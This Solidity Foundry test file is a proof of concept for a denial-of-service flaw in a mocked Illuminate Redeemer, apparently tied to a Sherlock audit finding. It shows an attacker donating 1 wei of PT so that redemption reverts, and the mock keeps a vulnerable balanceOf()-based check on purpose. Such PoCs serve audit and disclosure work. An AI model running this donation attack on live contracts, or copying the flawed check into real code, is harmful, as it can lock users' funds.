// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";

/*
 * @title APWine PT Redemption DoS PoC
 * @author Arkheionx (Yudis-bit)
 * @notice Proof of Concept demonstrating a permanent Denial of Service (DoS) 
 * vulnerability in Illuminate's Redeemer contract due to improper 
 * balance validation and susceptibility to donation attacks.
 * @reference Sherlock Audit - Illuminate (IllIllI High Severity)
 */

// Mock ERC20 Token representing PT (Principal Token) and FYT (Future Yield Token)
contract ERC20Mock {
    mapping(address => uint256) public balanceOf;
    
    function mint(address to, uint256 amount) external { 
        balanceOf[to] += amount; 
    }
    
    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

// Mock of the vulnerable Illuminate Redeemer contract
contract IlluminateRedeemerMock {
    ERC20Mock public pt;
    ERC20Mock public fyt;

    constructor(address _pt, address _fyt) {
        pt = ERC20Mock(_pt);
        fyt = ERC20Mock(_fyt);
    }

    function redeem() external {
        // VULNERABILITY: The contract assumes the PT balance directly correlates 
        // to the available FYT. It calculates the withdrawal amount based on strict 
        // balanceOf() reading, which can be manipulated via a direct transfer (donation).
        uint256 amountToWithdraw = pt.balanceOf(address(this));
        
        // If the PT balance is artificially inflated, this require statement will fail,
        // locking all user funds permanently.
        require(fyt.balanceOf(address(this)) >= amountToWithdraw, "Redemption failed: Insufficient FYT");
    }
}

contract IlluminateAPWineDoSPoC is Test {
    ERC20Mock pt;
    ERC20Mock fyt;
    IlluminateRedeemerMock illuminate;
    address attacker = address(0xBAD);

    function setUp() public {
        pt = new ERC20Mock();
        fyt = new ERC20Mock();
        illuminate = new IlluminateRedeemerMock(address(pt), address(fyt));

        // Initial state: Legitimate protocol operation with rolled-over funds
        pt.mint(address(illuminate), 100 ether);
        fyt.mint(address(illuminate), 100 ether);
    }

    function test_ApwineRedemptionDoS() public {
        console.log("=== Initial State ===");
        console.log("Illuminate PT Balance: ", pt.balanceOf(address(illuminate)));
        console.log("Illuminate FYT Balance:", fyt.balanceOf(address(illuminate)));

        // [ATTACK EXECUTION]
        // The attacker mints a single wei of PT and transfers it directly to the Redeemer contract.
        vm.startPrank(attacker);
        pt.mint(attacker, 1);
        pt.transfer(address(illuminate), 1);
        vm.stopPrank();

        console.log("\n=== Post-Attack State ===");
        console.log("Illuminate PT Balance: ", pt.balanceOf(address(illuminate)));
        console.log("Illuminate FYT Balance:", fyt.balanceOf(address(illuminate)));

        console.log("\n=== Victim Redemption Attempt ===");
        
        // The victim attempts to redeem, but the inflated PT balance causes a revert.
        vm.expectRevert("Redemption failed: Insufficient FYT");
        illuminate.redeem();
        
        console.log("[+] Exploit Successful: Permanent DoS achieved via 1 wei PT donation.");
    }
}
